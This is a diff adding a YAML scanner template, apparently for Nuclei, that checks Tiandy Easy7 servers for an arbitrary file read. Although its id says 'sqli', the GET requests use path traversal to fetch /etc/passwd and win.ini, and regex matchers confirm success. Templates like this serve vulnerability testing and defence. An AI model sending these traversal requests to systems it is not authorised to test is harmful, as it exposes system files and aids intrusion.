@@ -1,0 +1,34 @@
+id: tiandy-easy7-downloadResource-sqli
+info:
+  name: 天地伟业Easy7 downloadResource 任意文件读取
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59749/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: tiandy,fileread,easy7
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Easy7/rest/file/downloadResource?path=/../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/Easy7/rest/file/downloadResource?path=/../../../../../../../../c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+
